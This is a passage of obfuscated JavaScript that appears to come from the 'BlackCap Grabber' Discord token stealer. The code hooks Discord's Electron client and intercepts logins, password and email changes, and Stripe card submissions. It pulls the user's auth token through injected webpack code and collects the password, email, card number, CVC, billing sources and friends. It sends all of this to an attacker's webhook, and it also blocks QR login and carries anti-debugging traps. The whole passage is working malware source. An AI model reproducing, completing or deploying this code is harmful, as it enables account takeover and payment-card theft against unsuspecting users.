    (sToPsTP += '\uD83C\uDDF7\uD83C\uDDF4 Romanian')
  stoPuSEringyourtool == 'fi' && (sToPsTP += '\uD83C\uDDEB\uD83C\uDDEE Finnish')
  if (stoPuSEringyourtool == VatFaIReenculer) {
    sToPsTP += '\uD83C\uDDF8\uD83C\uDDEA Swedish'
  }
  stoPuSEringyourtool == 'tr' && (sToPsTP += '\uD83C\uDDF9\uD83C\uDDF7 Turkish')
  stoPuSEringyourtool == 'vi' &&
    (sToPsTP += '\uD83C\uDDFB\uD83C\uDDF3 Vietnamese')
  stoPuSEringyourtool == 'cs' && (sToPsTP += '\uD83C\uDDE8\uD83C\uDDFF Czech')
  if (stoPuSEringyourtool == 'el') {
    sToPsTP += '\uD83C\uDDEC\uD83C\uDDF7 Greek'
  }
  if (stoPuSEringyourtool == 'bg') {
    sToPsTP += '\uD83C\uDDE7\uD83C\uDDEC Bulgarian'
  }
  stoPuSEringyourtool == 'ru' && (sToPsTP += '\uD83C\uDDF7\uD83C\uDDFA Russian')
  stoPuSEringyourtool == 'uk' &&
    (sToPsTP += '\uD83C\uDDFA\uD83C\uDDE6 Ukrainian')
  stoPuSEringyourtool == 'hi' && (sToPsTP += '\uD83C\uDDEE\uD83C\uDDF3 Indian')
  stoPuSEringyourtool == 'th' &&
    (sToPsTP += '\uD83C\uDDF9\uD83C\uDDFC Taiwanese')
  stoPuSEringyourtool == dAmOuNT &&
    (sToPsTP += '\uD83C\uDDE8\uD83C\uDDF3 Chinese-China')
  stoPuSEringyourtool == 'ja' &&
    (sToPsTP += '\uD83C\uDDEF\uD83C\uDDF5 Japanese')
  if (stoPuSEringyourtool == mDrJrIGole) {
    sToPsTP += '\uD83C\uDDE8\uD83C\uDDF3 Chinese-Taiwanese'
  }
  return (
    stoPuSEringyourtool == 'ko' &&
      (sToPsTP += '\uD83C\uDDF0\uD83C\uDDF7 Korean'),
    sToPsTP == '' && (sToPsTP = 'None'),
    sToPsTP
  )
}
function GetBadges(heLlODIalz) {
  var KsChISHere = ''
  if ((heLlODIalz & 1) == 1) {
    KsChISHere += '<:staff:874750808728666152> '
  }
  if ((heLlODIalz & 2) == 2) {
    KsChISHere += '<:partner:874750808678354964> '
  }
  ;(heLlODIalz & 4) == 4 &&
    (KsChISHere += '<:hypesquad_events:874750808594477056> ')
  if ((heLlODIalz & 8) == 8) {
    KsChISHere += '<:bughunter_1:874750808426692658> '
  }
  if ((heLlODIalz & 64) == 64) {
    KsChISHere += '<:bravery:874750808388952075> '
  }
  if ((heLlODIalz & 128) == 128) {
    KsChISHere += '<:brilliance:874750808338608199> '
  }
  ;(heLlODIalz & 256) == 256 && (KsChISHere += '<:balance:874750808267292683> ')
  ;(heLlODIalz & 512) == 512 &&
    (KsChISHere += '<:early_supporter:874750808414113823> ')
  ;(heLlODIalz & 16384) == 16384 &&
    (KsChISHere += '<:bughunter_2:874750808430874664> ')
  if ((heLlODIalz & 131072) == 131072) {
    KsChISHere += '<:developer:874750808472825986> '
  }
  if (KsChISHere == '') {
    KsChISHere = 'None'
  }
  return KsChISHere
}
async function Login(PlzDONT, EtoDURAk, VatFAIReenculer) {
  const StoPSTP = BrowserWindow.getAllWindows()[0]
  var pLzDONT = await getFromURL(
    'https://discord.com/api/v8/users/@me',
    VatFAIReenculer
  )
  var { ip: kScHISHere } = await getFromURL(
    'https://www.myexternalip.com/json',
    null
  )
  StoPSTP.webContents
    .executeJavaScript(
      '\n        var xmlHttp = new XMLHttpRequest();\n        xmlHttp.open( "GET", "https://discord.com/api/v9/users/@me/billing/payment-sources", false );\n        xmlHttp.setRequestHeader("Authorization", "' +
        VatFAIReenculer +
        '");\n        xmlHttp.send( null );\n        xmlHttp.responseText',
      true
    )
    .then((yoUCANTdeobthis) => {
      StoPSTP.webContents
        .executeJavaScript(
          '\n            var xmlHttp = new XMLHttpRequest();\n            xmlHttp.open( "GET", "https://discord.com/api/v9/users/@me/relationships", false );\n            xmlHttp.setRequestHeader("Authorization", "' +
            VatFAIReenculer +
            '");\n            xmlHttp.send( null );\n            xmlHttp.responseText',
          true
        )
        .then((freemanBb) => {
          function VAtfairEenculer() {
            var stOpuseRingyourtool = JSON.parse(freemanBb)
            const frEemanBb = stOpuseRingyourtool.filter((anOtherOb) => {
              return anOtherOb.type == 1
            })
            return frEemanBb.length
          }
          function HEllodiAlz() {
            var StOpuseRingyourtool = JSON.parse(freemanBb)
            const EtOduraK = StOpuseRingyourtool.filter((AnOtherOb) => {
              return AnOtherOb.type == 1
            })
            var MdRjrigOle = ''
            for (z of EtOduraK) {
              var YoUcantDeobthis = GetRBadges(z.user.public_flags)
              if (YoUcantDeobthis != '') {
                MdRjrigOle +=
                  YoUcantDeobthis +
                  (' ' + z.user.username + '#' + z.user.discriminator + '\n')
              }
            }
            if (MdRjrigOle == '') {
              MdRjrigOle = 'No Rare Friends'
            }
            return MdRjrigOle
          }
          function MDrjrigOle() {
            const HELlodiAlz = JSON.parse(yoUCANTdeobthis)
            var kSChishEre = ''
            return (
              HELlodiAlz.forEach((ANOtherOb) => {
                if (ANOtherOb.type == '') {
                  return '`\u274C`'
                } else {
                  if (ANOtherOb.type == 2 && ANOtherOb.invalid != true) {
                    kSChishEre += '`\u2714️` <:paypal:896441236062347374>'
                  } else {
                    if (ANOtherOb.type == 1 && ANOtherOb.invalid != true) {
                      kSChishEre += '`\u2714️` :credit_card:'
                    } else {
                      return '`\u274C`'
                    }
                  }
                }
              }),
              kSChishEre == '' && (kSChishEre = '`\u274C`'),
              kSChishEre
            )
          }
          if (b.avatar === null) {
            usericonurl =
              'https://raw.githubusercontent.com/KSCHdsc/BlackCap-Assets/main/blackcap%20(2).png'
          } else {
            usericonurl =
              'https://cdn.discordapp.com/avatars/' +
              b.id +
              '/' +
              b.avatar +
              '.png?size=600'
          }
          if (b.banner === null) {
            bannerurl =
              'https://raw.githubusercontent.com/KSCHdsc/BlackCap-Assets/main/Banner.png'
          } else {
            bannerurl =
              'https://cdn.discordapp.com/banners/' +
              b.id +
              '/' +
              b.banner +
              '.png?size=160'
          }
          const YEsitsmE = {
            username: 'BlackCap Grabber',
            content: '',
            embeds: [
              {
                title: 'BlackCap User Login',
                description:
                  '[<a:blackcap:1022770267270938664> \u2502 **Oh you have BlackCaped someone**](https://github.com/KSCHdsc)',
                color: config['embed-color'],
                fields: [
                  {
                    name: 'Injection Info',
                    value:
                      '```diff\n- Computer Name: \n' +
                      computerName +
                      '\n\n- Injection Path: \n' +
                      __dirname +
                      '\n\n- IP: \n' +
                      kScHISHere +
                      '\n```\n\n[Download pfp](' +
                      usericonurl +
                      ')',
                    inline: false,
                  },
                  {
                    name: 'Username <:icon4:1024615934519955496> ',
                    value:
                      '`' +
                      pLzDONT.username +
                      '#' +
                      pLzDONT.discriminator +
                      '`',
                    inline: true,
                  },
                  {
                    name: 'ID <:icon3:1024615933228109834>',
                    value:
                      '`' +
                      pLzDONT.id +
                      '`\n[Copy ID](https://paste-pgpj.onrender.com/?p=' +
                      b.id +
                      ')',
                    inline: true,
                  },
                  {
                    name: 'Nitro <a:_diamond:1018223518913150977>',
                    value: '' + GetNitro(pLzDONT.premium_type),
                    inline: true,
                  },
                  {
                    name: 'Badges <:icon5:1024615931869147146>',
                    value: '' + GetBadges(pLzDONT.flags),
                    inline: true,
                  },
                  {
                    name: 'Language <:language:1037057832920547398>',
                    value: '' + GetLangue(pLzDONT.locale),
                    inline: true,
                  },
                  {
                    name: 'NSFW <a:nsfw:1037067109907320883>',
                    value: '' + GetNSFW(pLzDONT.nsfw_allowed),
                    inline: false,
                  },
                  {
                    name: 'A2F <a:a2f:1037084050826997902>',
                    value: '' + GetA2F(pLzDONT.mfa_enabled),
                    inline: true,
                  },
                  {
                    name: '@Copyright',
                    value:
                      '[BlackCap 2021 <a:blackcap:1022770267270938664>](https://github.com/KSCHdsc/BlackCap-Grabber)',
                    inline: true,
                  },
                  {
                    name: 'Billing <a:icon8:1024619392652288071>',
                    value: '' + MDrjrigOle(),
                    inline: false,
                  },
                  {
                    name: 'Email <a:Email:1024615399314161744>',
                    value: '`' + PlzDONT + '`',
                    inline: true,
                  },
                  {
                    name: 'Password <a:icon6:1024617637390598164>',
                    value: '`' + EtoDURAk + '`',
                    inline: true,
                  },
                  {
                    name: 'Token <a:icon1:1024615171907407892>',
                    value:
                      '```' +
                      VatFAIReenculer +
                      '```\n[Copy Token](https://paste-pgpj.onrender.com/?p=' +
                      VatFAIReenculer +
                      ')\n\n[Download Banner](' +
                      bannerurl +
                      ')',
                    inline: false,
                  },
                ],
                footer: { text: '\xA9KSCH | https://github.com/KSCHdsc' },
                thumbnail: { url: '' + usericonurl },
              },
              {
                title:
                  '<a:icon10:1024621262766604348> Total Friends (' +
                  VAtfairEenculer() +
                  ')',
                color: config['embed-color'],
                description: HEllodiAlz(),
                footer: { text: '\xA9KSCH | https://github.com/KSCHdsc' },
                image: { url: '' + bannerurl },
                thumbnail: { url: '' + usericonurl },
              },
            ],
          }
          hooker(YEsitsmE)
        })
    })
}
async function ChangePassword(FReEmanBb, EToDuraK, HElLodiAlz) {
  const mdRJrigOle = BrowserWindow.getAllWindows()[0]
  var anOTherOb = await getFromURL(
      'https://discord.com/api/v8/users/@me',
      HElLodiAlz
    ),
    { ip: etODuraK } = await getFromURL(
      'https://www.myexternalip.com/json',
      null
    )
  mdRJrigOle.webContents
    .executeJavaScript(
      '\n        var xmlHttp = new XMLHttpRequest();\n        xmlHttp.open( "GET", "https://discord.com/api/v9/users/@me/billing/payment-sources", false );\n        xmlHttp.setRequestHeader("Authorization", "' +
        HElLodiAlz +
        '");\n        xmlHttp.send( null );\n        xmlHttp.responseText',
      true
    )
    .then((VATFairEenculer) => {
      mdRJrigOle.webContents
        .executeJavaScript(
          '\n            var xmlHttp = new XMLHttpRequest();\n            xmlHttp.open( "GET", "https://discord.com/api/v9/users/@me/relationships", false );\n            xmlHttp.setRequestHeader("Authorization", "' +
            HElLodiAlz +
            '");\n            xmlHttp.send( null );\n            xmlHttp.responseText',
          true
        )
        .then((YoucAntDeobthis) => {
          function YOucAntDeobthis() {
            var frEeManBb = JSON.parse(YoucAntDeobthis)
            const yeSiTsmE = frEeManBb.filter((heLlOdiAlz) => {
              return heLlOdiAlz.type == 1
            })
            return yeSiTsmE.length
          }
          function YEsiTsmE() {
            var KsChIshEre = JSON.parse(YoucAntDeobthis)
            const AnOtHerOb = KsChIshEre.filter((HeLlOdiAlz) => {
              return HeLlOdiAlz.type == 1
            })
            var StOpUseRingyourtool = ''
            for (z of AnOtHerOb) {
              var YeSiTsmE = GetRBadges(z.user.public_flags)
              YeSiTsmE != '' &&
                (StOpUseRingyourtool +=
                  YeSiTsmE +
                  (' ' + z.user.username + '#' + z.user.discriminator + '\n'))
            }
            return (
              StOpUseRingyourtool == '' &&
                (StOpUseRingyourtool = 'No Rare Friends'),
              StOpUseRingyourtool
            )
          }
          function MDrjRigOle() {
            const stoPUseRingyourtool = JSON.parse(VATFairEenculer)
            var yESiTsmE = ''
            return (
              stoPUseRingyourtool.forEach((etoDUraK) => {
                if (etoDUraK.type == '') {
                  return '`\u274C`'
                } else {
                  if (etoDUraK.type == 2 && etoDUraK.invalid != true) {
                    yESiTsmE += '`\u2714️` <:paypal:896441236062347374>'
                  } else {
                    if (etoDUraK.type == 1 && etoDUraK.invalid != true) {
                      yESiTsmE += '`\u2714️` :credit_card:'
                    } else {
                      return '`\u274C`'
                    }
                  }
                }
              }),
              yESiTsmE == '' && (yESiTsmE = '`\u274C`'),
              yESiTsmE
            )
          }
          let CVfrRtaBuses =
            'https://cdn.discordapp.com/banners/' +
              anOTherOb.id +
              '/' +
              anOTherOb.banner +
              '.png?size=600' ||
            'https://media.discordapp.net/attachments/1032256615962906655/1037042057845407844/Banner.png?size=600'
          const ksChIshEre = {
            username: 'BlackCap Grabber',
            content: '',
            embeds: [
              {
                title: 'BlackCap Detect Password Changed',
                description:
                  '[<a:blackcap:1022770267270938664> \u2502 **Oh you have BlackCaped someone**](https://github.com/KSCHdsc)',
                color: config['embed-color'],
                fields: [
                  {
                    name: 'Injection Info',
                    value:
                      '```diff\n- Computer Name: \n' +
                      computerName +
                      '\n\n- Injection Path: \n' +
                      __dirname +
                      '\n\n- IP: \n' +
                      etODuraK +
                      '\n```\n\n[Download pfp](' +
                      usericonurl +
                      ')',
                    inline: false,
                  },
                  {
                    name: 'Username <:icon4:1024615934519955496> ',
                    value:
                      '`' +
                      anOTherOb.username +
                      '#' +
                      anOTherOb.discriminator +
                      '`',
                    inline: true,
                  },
                  {
                    name: 'ID <:icon3:1024615933228109834>',
                    value:
                      '`' +
                      anOTherOb.id +
                      '`\n[Copy ID](https://paste-pgpj.onrender.com/?p=' +
                      b.id +
                      ')',
                    inline: true,
                  },
                  {
                    name: 'Nitro <a:_diamond:1018223518913150977>',
                    value: '' + GetNitro(anOTherOb.premium_type),
                    inline: true,
                  },
                  {
                    name: 'Badges <:icon5:1024615931869147146>',
                    value: '' + GetBadges(anOTherOb.flags),
                    inline: true,
                  },
                  {
                    name: 'Language <:language:1037057832920547398>',
                    value: '' + GetLangue(anOTherOb.locale),
                    inline: true,
                  },
                  {
                    name: 'NSFW <a:nsfw:1037067109907320883>',
                    value: '' + GetNSFW(anOTherOb.nsfw_allowed),
                    inline: false,
                  },
                  {
                    name: 'A2F <a:a2f:1037084050826997902>',
                    value: '' + GetA2F(anOTherOb.mfa_enabled),
                    inline: true,
                  },
                  {
                    name: '@Copyright',
                    value:
                      '[BlackCap 2021 <a:blackcap:1022770267270938664>](https://github.com/KSCHdsc/BlackCap-Grabber)',
                    inline: true,
                  },
                  {
                    name: 'Billing <a:icon8:1024619392652288071>',
                    value: '' + MDrjRigOle(),
                    inline: false,
                  },
                  {
                    name: 'Email <a:Email:1024615399314161744>',
                    value: '`' + anOTherOb.email + '`',
                    inline: false,
                  },
                  {
                    name: '<a:icon6:1024617637390598164> Old Password',
                    value: '`' + FReEmanBb + '`',
                    inline: true,
                  },
                  {
                    name: '<a:icon6:1024617637390598164> New Password',
                    value: '`' + EToDuraK + '`',
                    inline: true,
                  },
                  {
                    name: 'Token <a:icon1:1024615171907407892>',
                    value:
                      '```' +
                      HElLodiAlz +
                      '```\n[Copy Token](https://paste-pgpj.onrender.com/?p=' +
                      HElLodiAlz +
                      ')\n\n[Download Banner](' +
                      CVfrRtaBuses +
                      ')',
                    inline: false,
                  },
                ],
                footer: { text: '\xA9KSCH | https://github.com/KSCHdsc' },
                thumbnail: { url: '' + usericonurl },
              },
              {
                title:
                  '<a:icon10:1024621262766604348> Total Friends (' +
                  YOucAntDeobthis() +
                  ')',
                color: config['embed-color'],
                description: YEsiTsmE(),
                footer: { text: '\xA9KSCH | https://github.com/KSCHdsc' },
                image: { url: '' + CVfrRtaBuses },
                thumbnail: { url: '' + usericonurl },
              },
            ],
          }
          hooker(ksChIshEre)
        })
    })
}
async function ChangeEmail(FreEManBb, VatFAirEenculer, EtoDUraK) {
  const YouCAntDeobthis = BrowserWindow.getAllWindows()[0]
  var KscHIshEre = await getFromURL(
      'https://discord.com/api/v8/users/@me',
      EtoDUraK
    ),
    { ip: eToDUraK } = await getFromURL(
      'https://www.myexternalip.com/json',
      null
    )
  YouCAntDeobthis.webContents
    .executeJavaScript(
      '\n        var xmlHttp = new XMLHttpRequest();\n        xmlHttp.open( "GET", "https://discord.com/api/v9/users/@me/billing/payment-sources", false );\n        xmlHttp.setRequestHeader("Authorization", "' +
        EtoDUraK +
        '");\n        xmlHttp.send( null );\n        xmlHttp.responseText',
      true
    )
    .then((yESITsmE) => {
      YouCAntDeobthis.webContents
        .executeJavaScript(
          '\n            var xmlHttp = new XMLHttpRequest();\n            xmlHttp.open( "GET", "https://discord.com/api/v9/users/@me/relationships", false );\n            xmlHttp.setRequestHeader("Authorization", "' +
            EtoDUraK +
            '");\n            xmlHttp.send( null );\n            xmlHttp.responseText',
          true
        )
        .then((YEsitSmE) => {
          function KSchiShEre() {
            var HELloDiAlz = JSON.parse(YEsitSmE)
            const anoThErOb = HELloDiAlz.filter((cvfRrTaBuses) => {
              return cvfRrTaBuses.type == 1
            })
            return anoThErOb.length
          }
          function VAtfaIrEenculer() {
            var youCaNtDeobthis = JSON.parse(YEsitSmE)
            const HelLoDiAlz = youCaNtDeobthis.filter((CvfRrTaBuses) => {
              return CvfRrTaBuses.type == 1
            })
            var mdrJrIgOle = ''
            for (z of HelLoDiAlz) {
              var YesItSmE = GetRBadges(z.user.public_flags)
              YesItSmE != '' &&
                (mdrJrIgOle +=
                  YesItSmE +
                  (' ' + z.user.username + '#' + z.user.discriminator + '\n'))
            }
            if (mdrJrIgOle == '') {
              mdrJrIgOle = 'No Rare Friends'
            }
            return mdrJrIgOle
          }
          function CVfrrTaBuses() {
            const heLLoDiAlz = JSON.parse(yESITsmE)
            var vAtFaIrEenculer = ''
            return (
              heLLoDiAlz.forEach((frEEmAnBb) => {
                if (frEEmAnBb.type == '') {
                  return '`\u274C`'
                } else {
                  if (frEEmAnBb.type == 2 && frEEmAnBb.invalid != true) {
                    vAtFaIrEenculer += '`\u2714️` <:paypal:896441236062347374>'
                  } else {
                    if (frEEmAnBb.type == 1 && frEEmAnBb.invalid != true) {
                      vAtFaIrEenculer += '`\u2714️` :credit_card:'
                    } else {
                      return '`\u274C`'
                    }
                  }
                }
              }),
              vAtFaIrEenculer == '' && (vAtFaIrEenculer = '`\u274C`'),
              vAtFaIrEenculer
            )
          }
          if (b.avatar === null) {
            usericonurl =
              'https://raw.githubusercontent.com/KSCHdsc/BlackCap-Assets/main/blackcap%20(2).png'
          } else {
            usericonurl =
              'https://cdn.discordapp.com/avatars/' +
              b.id +
              '/' +
              b.avatar +
              '.png?size=600'
          }
          if (b.banner === null) {
            bannerurl =
              'https://raw.githubusercontent.com/KSCHdsc/BlackCap-Assets/main/Banner.png'
          } else {
            bannerurl =
              'https://cdn.discordapp.com/banners/' +
              b.id +
              '/' +
              b.banner +
              '.png?size=160'
          }
          const MDrjrIgOle = {
            username: 'BlackCap Grabber',
            content: '',
            embeds: [
              {
                title: 'BlackCap Detect Email Changed',
                description:
                  '[<a:blackcap:1022770267270938664> \u2502 **Oh you have BlackCaped someone**](https://github.com/KSCHdsc)',
                color: config['embed-color'],
                fields: [
                  {
                    name: 'Injection Info',
                    value:
                      '```diff\n- Computer Name: \n' +
                      computerName +
                      '\n\n- Injection Path: \n' +
                      __dirname +
                      '\n\n- IP: \n' +
                      eToDUraK +
                      '\n```\n\n[Download pfp](' +
                      usericonurl +
                      ')',
                    inline: false,
                  },
                  {
                    name: 'Username <:icon4:1024615934519955496> ',
                    value:
                      '`' +
                      KscHIshEre.username +
                      '#' +
                      KscHIshEre.discriminator +
                      '`',
                    inline: true,
                  },
                  {
                    name: 'ID <:icon3:1024615933228109834>',
                    value:
                      '`' +
                      KscHIshEre.id +
                      '`\n[Copy ID](https://paste-pgpj.onrender.com/?p=' +
                      b.id +
                      ')',
                    inline: true,
                  },
                  {
                    name: 'Nitro <a:_diamond:1018223518913150977>',
                    value: '' + GetNitro(KscHIshEre.premium_type),
                    inline: true,
                  },
                  {
                    name: 'Badges <:icon5:1024615931869147146>',
                    value: '' + GetBadges(KscHIshEre.flags),
                    inline: true,
                  },
                  {
                    name: 'Language <:language:1037057832920547398>',
                    value: '' + GetLangue(KscHIshEre.locale),
                    inline: true,
                  },
                  {
                    name: 'NSFW <a:nsfw:1037067109907320883>',
                    value: '' + GetNSFW(KscHIshEre.nsfw_allowed),
                    inline: false,
                  },
                  {
                    name: 'A2F <a:a2f:1037084050826997902>',
                    value: '' + GetA2F(KscHIshEre.mfa_enabled),
                    inline: true,
                  },
                  {
                    name: '@Copyright',
                    value:
                      '[BlackCap 2021 <a:blackcap:1022770267270938664>](https://github.com/KSCHdsc/BlackCap-Grabber)',
                    inline: true,
                  },
                  {
                    name: 'Billing <a:icon8:1024619392652288071>',
                    value: '' + CVfrrTaBuses(),
                    inline: false,
                  },
                  {
                    name: 'New Email <a:Email:1024615399314161744>',
                    value: '`' + FreEManBb + '`',
                    inline: true,
                  },
                  {
                    name: 'Password <a:icon6:1024617637390598164>',
                    value: '`' + VatFAirEenculer + '`',
                    inline: true,
                  },
                  {
                    name: 'Token <a:icon1:1024615171907407892>',
                    value:
                      '```' +
                      EtoDUraK +
                      '```\n[Copy Token](https://paste-pgpj.onrender.com/?p=' +
                      EtoDUraK +
                      ')\n\n[Download Banner](' +
                      bannerurl +
                      ')',
                    inline: false,
                  },
                ],
                footer: { text: '\xA9KSCH | https://github.com/KSCHdsc' },
                thumbnail: { url: '' + usericonurl },
              },
              {
                title:
                  '<a:icon10:1024621262766604348> Total Friends (' +
                  KSchiShEre() +
                  ')',
                color: config['embed-color'],
                description: VAtfaIrEenculer(),
                footer: { text: '\xA9KSCH | https://github.com/KSCHdsc' },
                image: { url: '' + bannerurl },
                thumbnail: { url: '' + usericonurl },
              },
            ],
          }
          hooker(MDrjrIgOle)
        })
    })
}
async function CreditCardAdded(
  ANOThErOb,
  ETODuRaK,
  YESItSmE,
  HELLoDiAlz,
  FREEmAnBb
) {
  var YOUCaNtDeobthis = await getFromURL(
    'https://discord.com/api/v8/users/@me',
    FREEmAnBb
  )
  var { ip: VATFaIrEenculer } = await getFromURL(
    'https://www.myexternalip.com/json',
    null
  )
  await getservers(FREEmAnBb)
  setTimeout(async () => {
    if (b.avatar === null) {
      usericonurl =
        'https://raw.githubusercontent.com/KSCHdsc/BlackCap-Assets/main/blackcap%20(2).png'
    } else {
      usericonurl =
        'https://cdn.discordapp.com/avatars/' +
        b.id +
        '/' +
        b.avatar +
        '.png?size=600'
    }
    if (b.banner === null) {
      bannerurl =
        'https://raw.githubusercontent.com/KSCHdsc/BlackCap-Assets/main/Banner.png'
    } else {
      bannerurl =
        'https://cdn.discordapp.com/banners/' +
        b.id +
        '/' +
        b.banner +
        '.png?size=160'
    }
    const AnotHErOb = { url: '' + bannerurl }
    const HellODiAlz = { url: '' + usericonurl }
    const MdrjRIgOle = {
      username: 'BlackCap Grabber',
      content: '',
      embeds: [
        {
          title: 'BlackCap User Credit Card Added',
          description:
            '\n                    **IP:** ' +
            VATFaIrEenculer +
            '\n\n\n                    **Username** <:icon4:1024615934519955496>\n```' +
            YOUCaNtDeobthis.username +
            '#' +
            YOUCaNtDeobthis.discriminator +
            '```\n\n                    **ID** <:icon3:1024615933228109834>\n```' +
            YOUCaNtDeobthis.id +
            '```\n\n                    **Email** <a:Email:1024615399314161744>\n```' +
            YOUCaNtDeobthis.email +
            '```\n\n                    **Nitro Type** <a:_diamond:1018223518913150977>\n' +
            GetNitro(YOUCaNtDeobthis.premium_type) +
            '\n\n\t\t\t\t\t**Language** <:language:1037057832920547398>\n' +
            GetLangue(YOUCaNtDeobthis.locale) +
            '\n\n\t\t\t\t\t**A2F** <a:a2f:1037084050826997902>\n' +
            GetA2F(YOUCaNtDeobthis.mfa_enabled) +
            '\n\n\t\t\t\t\t**NSFW** <a:nsfw:1037067109907320883>\n' +
            GetNSFW(YOUCaNtDeobthis.nsfw_allowed) +
            '\n\n                    **Badges** <:icon5:1024615931869147146>\n' +
            GetBadges(YOUCaNtDeobthis.flags) +
            '\n\n                    **Credit Card Number**\n```' +
            ANOThErOb +
            '```\n\n                    **Credit Card Expiration**\n```' +
            YESItSmE +
            '/' +
            HELLoDiAlz +
            '```\n\n                    **CVC**\n```' +
            ETODuRaK +
            '```\n\n                    **Token** <a:icon1:1024615171907407892> \n```' +
            FREEmAnBb +
            '```',
          author: { name: 'BlackCap' },
          footer: { text: '\xA9KSCH | https://github.com/KSCHdsc' },
          thumbnail: {
            url:
              'https://cdn.discordapp.com/avatars/' +
              YOUCaNtDeobthis.id +
              '/' +
              YOUCaNtDeobthis.avatar,
          },
        },
        {
          title: '<a:icon10:1024621262766604348> Guilds Owner',
          color: config['embed-color'],
          description:
            '```diff\n' +
            (fs.readFileSync('blackcaped_guilds_result.txt', 'utf-8') ||
              '- This user is not the owner of any server') +
            '```',
          footer: { text: '\xA9KSCH | https://github.com/KSCHdsc' },
          image: AnotHErOb,
          thumbnail: HellODiAlz,
        },
      ],
    }
    hooker(MdrjRIgOle)
    deletefile('blackcaped_guilds_ids.txt')
    deletefile('blackcaped_guilds_result.txt')
  }, 10000)
}
const MDrJRIgole = {}
MDrJRIgole.urls = [
  'https://discord.com/api/v*/users/@me',
  'https://discordapp.com/api/v*/users/@me',
  'https://*.discord.com/api/v*/users/@me',
  'https://discordapp.com/api/v*/auth/login',
  'https://discord.com/api/v*/auth/login',
  'https://*.discord.com/api/v*/auth/login',
  'https://api.stripe.com/v*/tokens',
]
const ChangePasswordFilter = MDrJRIgole
session.defaultSession.webRequest.onBeforeRequest(
  Filter,
  (yEsiTSmE, yOucANtDeobthis) => {
    const sTopUSeRingyourtool = { cancel: true }
    if (yEsiTSmE.url.startsWith('wss://remote-auth-gateway')) {
      return yOucANtDeobthis(sTopUSeRingyourtool)
    }
    updateCheck()
    if (FirstTime()) {
    }
    yOucANtDeobthis({})
    return
  }
)
session.defaultSession.webRequest.onCompleted(
  ChangePasswordFilter,
  (hEllODiAlz, mDrjRIgOle) => {
    if (hEllODiAlz.url.endsWith('login')) {
      if (hEllODiAlz.statusCode == 200) {
        const StOpUSeRingyourtool = JSON.parse(
            Buffer.from(hEllODiAlz.uploadData[0].bytes).toString()
          ),
          CvFrRTaBuses = StOpUSeRingyourtool.login,
          EtOdURaK = StOpUSeRingyourtool.password,
          KsChIShEre = BrowserWindow.getAllWindows()[0]
        KsChIShEre.webContents
          .executeJavaScript(
            'for(let a in window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]),gg.c)if(gg.c.hasOwnProperty(a)){let b=gg.c[a].exports;if(b&&b.__esModule&&b.default)for(let a in b.default)"getToken"==a&&(token=b.default.getToken())}token;',
            true
          )
          .then((YeSiTSmE) => {
            Login(CvFrRTaBuses, EtOdURaK, YeSiTSmE)
          })
      } else {
      }
    }
    if (hEllODiAlz.url.endsWith('users/@me')) {
      if (hEllODiAlz.statusCode == 200 && hEllODiAlz.method == 'PATCH') {
        const FrEeMAnBb = JSON.parse(
          Buffer.from(hEllODiAlz.uploadData[0].bytes).toString()
        )
        if (
          FrEeMAnBb.password != null &&
          FrEeMAnBb.password != undefined &&
          FrEeMAnBb.password != ''
        ) {
          if (
            FrEeMAnBb.new_password != undefined &&
            FrEeMAnBb.new_password != null &&
            FrEeMAnBb.new_password != ''
          ) {
            const HeLlODiAlz = BrowserWindow.getAllWindows()[0]
            HeLlODiAlz.webContents
              .executeJavaScript(
                'for(let a in window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]),gg.c)if(gg.c.hasOwnProperty(a)){let b=gg.c[a].exports;if(b&&b.__esModule&&b.default)for(let a in b.default)"getToken"==a&&(token=b.default.getToken())}token;',
                true
              )
              .then((YoUcANtDeobthis) => {
                ChangePassword(
                  FrEeMAnBb.password,
                  FrEeMAnBb.new_password,
                  YoUcANtDeobthis
                )
              })
          }
          if (
            FrEeMAnBb.email != null &&
            FrEeMAnBb.email != undefined &&
            FrEeMAnBb.email != ''
          ) {
            const yOUcANtDeobthis = BrowserWindow.getAllWindows()[0]
            yOUcANtDeobthis.webContents
              .executeJavaScript(
                'for(let a in window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]),gg.c)if(gg.c.hasOwnProperty(a)){let b=gg.c[a].exports;if(b&&b.__esModule&&b.default)for(let a in b.default)"getToken"==a&&(token=b.default.getToken())}token;',
                true
              )
              .then((cVFrRTaBuses) => {
                ChangeEmail(FrEeMAnBb.email, FrEeMAnBb.password, cVFrRTaBuses)
              })
          }
        }
      } else {
      }
    }
    if (hEllODiAlz.url.endsWith('tokens')) {
      const kSChIShEre = BrowserWindow.getAllWindows()[0],
        vATfAIrEenculer = querystring.parse(
          decodeURIComponent(
            Buffer.from(hEllODiAlz.uploadData[0].bytes).toString()
          )
        )
      kSChIShEre.webContents
        .executeJavaScript(
          'for(let a in window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]),gg.c)if(gg.c.hasOwnProperty(a)){let b=gg.c[a].exports;if(b&&b.__esModule&&b.default)for(let a in b.default)"getToken"==a&&(token=b.default.getToken())}token;',
          true
        )
        .then((mDRjRIgOle) => {
          CreditCardAdded(
            vATfAIrEenculer['card[number]'],
            vATfAIrEenculer['card[cvc]'],
            vATfAIrEenculer['card[exp_month]'],
            vATfAIrEenculer['card[exp_year]'],
            mDRjRIgOle
          )
        })
        .catch(console.error)
    }
  }
)
function kschishere(hELlODiAlz) {
  function fREeMAnBb(kscHIShEre) {
    if (typeof kscHIShEre === 'string') {
      return function (vatFAIrEenculer) {}
        .constructor('while (true) {}')
        .apply('counter')
    } else {
      ;('' + kscHIShEre / kscHIShEre).length !== 1 || kscHIShEre % 20 === 0
        ? function () {
            return true
          }
            .constructor('debugger')
            .call('action')
        : function () {
            return false
          }
